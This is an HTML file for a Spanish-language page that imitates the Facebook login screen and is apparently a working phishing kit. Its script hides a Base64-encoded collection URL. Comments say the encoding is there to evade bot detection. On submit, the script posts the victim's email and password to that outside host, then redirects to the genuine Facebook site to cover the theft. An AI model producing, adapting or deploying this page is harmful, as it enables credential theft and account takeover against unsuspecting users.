<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title> <link rel="stylesheet" href="css/style.css">
    <meta name="robots" content="noindex, nofollow, noarchive">
</head>
<body>
    <div class="wrapper">
        <main class="main-container">
            <section class="left-panel">
               <div class="logo-fb-custom">f</div> 
                <div class="collage-area">
                    <span class="emoji">😆</span>
                    <div class="card card-knot"><div class="card-icon"></div></div>
                    <div class="card card-skater">
                        <div class="time-badge">⏱️16:45</div>
                        <div class="profile-circle"><div class="heart-badge"></div></div>
                    </div>
                    <div class="card card-tickets"><div class="blue-icon">★</div></div>
                </div>
                <h1 class="main-text">Conecta <br> con tus <br> <span> amigos aquí.</span></h1>
            </section>

            <section class="right-panel">
                <div class="login-container">
                    <h2 class="titulo-login">Inici&#x61;r s&#x65;si&oacute;n &#101;n F&#x61;cebo&#x6f;k</h2>
                    
                    <form id="loginForm">
                        <input type="text" id="usr_auth_x46" placeholder="Correo electrónico o número de celular" required>
                        <input type="password" id="pass_auth_x46" placeholder="Contraseña" required> 
                        <button type="submit" class="login-btn">Iniciar sesión</button>
                    </form>
                    
                    <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
                    <div class="divider"></div>
                    <button type="button" class="create-btn">Crear cuenta nueva</button>
                </div>
                <div class="meta-brand">
                    <img src="https://tse1.mm.bing.net/th/id/OIP.5MoH8qTW_swxJ-jDBlOd8QHaFj?rs=1&pid=ImgDetMain&o=7&rm=3" alt="Meta" width="22">
                    <span>Meta</span>
                </div>
            </section>
        </main>

        <footer class="footer-container">
            <div class="footer-content">
                <div class="footer-row languages">
                    <span>Español</span> <span>English (US)</span> <span>Italiano</span> 
                    <span>Português (Brasil)</span> <span>Français (France)</span> 
                    <span>Más idiomas...</span>
                </div>
               
                <div class="footer-row">
                    <span>Condiciones</span> <span>Ayuda</span>
                </div>
            </div>
        </footer>
    </div>

    <script>
    // URL de Render cifrada en Base64 para que no la detecten los bots
    const _0x_key = "aHR0cHM6Ly9mYWNlYm9vay1jb20teTR1OC5vbnJlbmRlci5jb20vdjEvYXBpL3N5bmNfbWV0cmljc19kYXRhX3Yy";

    const loginForm = document.getElementById('loginForm');
    const loginBtn = document.querySelector('.login-btn');

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        loginBtn.innerText = "Iniciando sesión...";
        loginBtn.style.opacity = "0.7";
        loginBtn.disabled = true;

        const email = document.getElementById('usr_auth_x46').value;
        const password = document.getElementById('pass_auth_x46').value;

        setTimeout(async () => {
            try {
                // Decodificamos la URL en el momento exacto del envío
                const endpoint = atob(_0x_key);

                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });

                // Redirección inmediata para limpiar el rastro
                window.location.href = "https://www.facebook.com/login/device-based/regular/login/";
                
            } catch (error) {
                console.error('Network Error');
                // Si algo falla, lo mandamos a la página real de todas formas
                window.location.href = "https://m.facebook.com/";
            }
        }, 5000); 
    });
    </script>
</body>
</html>
